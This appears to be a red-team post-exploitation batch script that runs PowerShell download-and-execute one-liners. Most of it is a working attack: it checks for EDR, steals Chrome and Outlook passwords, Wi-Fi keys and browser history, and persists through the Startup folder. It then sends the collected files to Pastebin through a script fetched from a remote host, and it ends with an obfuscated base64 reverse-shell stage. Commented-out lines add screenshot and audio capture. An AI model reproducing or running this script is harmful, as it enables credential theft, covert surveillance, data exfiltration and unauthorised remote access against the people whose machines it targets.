echo FULL RECON STARTED
echo CHECK EDR PRESENCE
powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Check_EDR_Presence.ps1);Invoke-EDRCheck" >> C:\Windows\Temp\Check_EDR_Presence.txt
echo CHECK EDR PRESENCE COMPLETED

echo STARTING HOST RECON
powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_Complete.bat -o C:\Windows\Temp\Host_Recon_Complete.bat;C:\Windows\Temp\Host_Recon_Complete.bat;del C:\Windows\Temp\Host_Recon_Complete.bat"
echo HOST RECON COMPLETED at C:\Windows\Temp\Host_Recon_Complete.txt

echo RETRIEVING CHROME PASSWORDS
powershell.exe "iex (iwr https://raw.githubusercontent.com/kerrymilan/Get-ChromeCreds2/master/Get-ChromeCreds2.ps1);" >> C:\Windows\Temp\Chorme_PW.txt
echo CHROME PASSWORDS RETRIEVED

echo GET WIFI PASSWORDS
powershell.exe -Command """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SID_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize""" >> C:\Windows\Temp\Wifi_PW.txt
echo WIFI PASSWORDS RETRIEVED

echo GET_BROWSER_DATA
powershell.exe iwr https://github.com/tresacton/PasswordStealer/raw/master/BrowsingHistoryView.exe -o C:\Windows\Temp\Browser_History_View.exe;C:\Windows\Temp\Browser_History_View.exe /stext C:\Windows\Temp\Browsers_History.txt; Sleep 10; del C:\Windows\Temp\Browser_History_View.exe
echo BROWSER DATA RETRIEVED

REM ####EXTRA####
REM echo SCREENSHOT
REM powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Path_Selection.ps1);New-ScreenShot -Full -Path C:\Windows\Temp\ScreenShot.jpg"
REM echo SCREENSHOT TAKEN

REM echo GET OUTLOOK PASSWORD
REM powershell.exe wget https://github.com/tresacton/PasswordStealer/raw/master/mailpv.exe -o C:\Windows\Temp\mailpv.exe;C:\Windows\Temp\mailpv.exe /stext C:\Windows\Temp\mailpv.txt
REM echo OUTLOOK PASSWORD RETRIEVED

REM echo SOUND RECORDER WIN 7
REM soundrecorder /FILE C:\Windows\Temp\audio.wma /DURATION 00:00:10
REM echo SOUND RECORDED

echo SET PERSISTENCE
copy C:\Windows\Temp\RECON.bat "C:\Users\Bank_Security\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RECON.bat" 
echo PERSISTENCE DONE

echo START EXFILTRATION
powershell.exe IEX (iwr http://172.16.217.130/Out-Pastebin.ps1); Out-Pastebin -InputObject $(Get-Content C:\Windows\Temp\Check_EDR_Presence.txt, C:\Windows\Temp\Host_Recon_Complete.txt, C:\Windows\Temp\Chorme_PW.txt, C:\Windows\Temp\Wifi_PW.txt, C:\Windows\Temp\Browsers_History.txt) -PasteTitle "Full_Recon_$env:computername" -ExpiresIn 10M -Visibility Private
echo EXFILTRATION COMPLETED

echo START REVERSE SHELL
ECHo "Iex([tEXT.encODInG]::Ascii.getstring([CONVErt]::fRoMBasE64sTrInG(([TEXT.encodiNG]::ascii.gEtstRing(([TExt.enCOdiNG]::aScII.gEtByTES({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})|sOrt-ObjEcT {gEt-ranDom -SeTseed 772994849}))))));exiT" | PowERSHELL "ieX(IEx($INput))"&exiT
